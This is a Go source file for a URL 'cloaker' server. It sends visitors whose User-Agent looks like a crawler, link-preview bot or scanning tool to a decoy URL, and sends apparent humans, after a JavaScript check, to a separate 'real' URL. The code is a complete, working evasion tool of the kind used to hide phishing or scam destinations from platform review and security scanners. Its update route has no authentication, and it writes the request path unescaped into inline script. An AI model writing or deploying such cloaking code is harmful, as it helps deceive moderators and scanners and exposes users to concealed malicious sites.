package main

import (
	"encoding/json"
	"net/http"
	"strings"
	"sync"

	"github.com/go-chi/chi/v5"
)

// Structure to store real and bot URLs for each ID
type Link struct {
	Real string `json:"real"`
	Bot  string `json:"bot"`
}

// In-memory map to store ID -> Link mappings
var linkMap = make(map[string]Link)
var mapMutex = &sync.RWMutex{} // Mutex for concurrent access to the map

// Checks if the User-Agent indicates a bot
func isBot(userAgent string) bool {
	botIdentifiers := []string{
		"bot", "crawl", "spider", "slurp", "facebook", "google", "bing", "yahoo",
		"duckduckgo", "baidu", "yandex", "sogou", "exabot", "ia_archiver", "twitterbot",
		"telegrambot", "whatsapp", "mediapartners", "applebot", "embedly", "quora",
		"pinterest", "redditbot", "slackbot", "vkshare", "w3c_validator", "wget", "curl",
		"java", "libwww-perl", "python-requests", "httpclient", "aiohttp", "okhttp", "scrapy",
		"php", "go-http-client", "ruby", "node-fetch",
	}
	for _, identifier := range botIdentifiers {
		if strings.Contains(strings.ToLower(userAgent), identifier) {
			return true
		}
	}
	return false
}

// Cloaker handler to handle requests based on ID
func cloakedHandler(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	// Retrieve the link data for the provided ID
	mapMutex.RLock()
	link, exists := linkMap[id]
	mapMutex.RUnlock()

	if !exists {
		http.Error(w, "ID not found", http.StatusNotFound)
		return
	}

	userAgent := r.Header.Get("User-Agent")

	// Redirect to the appropriate URL based on the User-Agent
	if isBot(userAgent) {
		http.Redirect(w, r, link.Bot, http.StatusFound)
	} else {
		// Check for JavaScript support
		if _, ok := r.URL.Query()["js"]; !ok {
			// Serve HTML with JavaScript to check if JavaScript is enabled
			w.Header().Set("Content-Type", "text/html")
			w.Write([]byte(`
				<html>
					<head>
						<title>Checking...</title>
						<script>
							window.location.href = "` + r.URL.Path + `?js=enabled";
						</script>
					</head>
					<body>
						Redirecting...
					</body>
				</html>
			`))
			return
		}
		http.Redirect(w, r, link.Real, http.StatusFound)
	}
}

// Handler to update the ID -> {real, bot} mappings
func updateLinkHandler(w http.ResponseWriter, r *http.Request) {
	id := chi.URLParam(r, "id")

	var link Link
	err := json.NewDecoder(r.Body).Decode(&link)
	if err != nil {
		http.Error(w, "Invalid request payload", http.StatusBadRequest)
		return
	}

	// Update the map with the new links
	mapMutex.Lock()
	linkMap[id] = link
	mapMutex.Unlock()

	w.WriteHeader(http.StatusOK)
	w.Write([]byte("Links updated successfully"))
}

func main() {
	// Initialize the chi router
	r := chi.NewRouter()

	// Route to handle cloaking logic
	r.Get("/{id}", cloakedHandler)

	// Route to update the link mappings
	r.Post("/update/{id}", updateLinkHandler)

	// Start the server
	http.ListenAndServe(":8080", r)
}
